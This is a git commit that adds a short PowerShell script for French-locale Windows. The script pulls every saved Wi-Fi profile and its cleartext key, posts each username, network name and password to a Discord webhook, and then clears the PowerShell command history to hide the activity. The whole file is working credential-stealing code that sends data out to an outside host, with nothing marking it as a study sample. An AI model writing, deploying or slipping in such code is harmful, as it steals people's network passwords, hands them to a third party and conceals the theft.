ed2b655c8647ff4abdb3304250f23db671c7bd6d
Wakior <45673811+Wakior@users.noreply.github.com>
2023-09-22 11:19:20 +0200

    Create Windows-Passwords-FR.ps1

---
+++ Windows-Passwords-FR.ps1
@@ -0,0 +1,15 @@
+# FR
+netsh wlan show profile | Select-String '(?<=Profil Tous les utilisateurs\s+:\s).+' | ForEach-Object {
+    $wlan  = $_.Matches.Value
+    $passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=Contenu de la clé\s+:\s).+'
+
+	$Body = @{
+		'username' = $env:username + " | " + [string]$wlan
+		'content' = [string]$passw
+	}
+	
+	Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body ($Body | ConvertTo-Json)
+}
+
+# Clear the PowerShell command history
+Clear-History
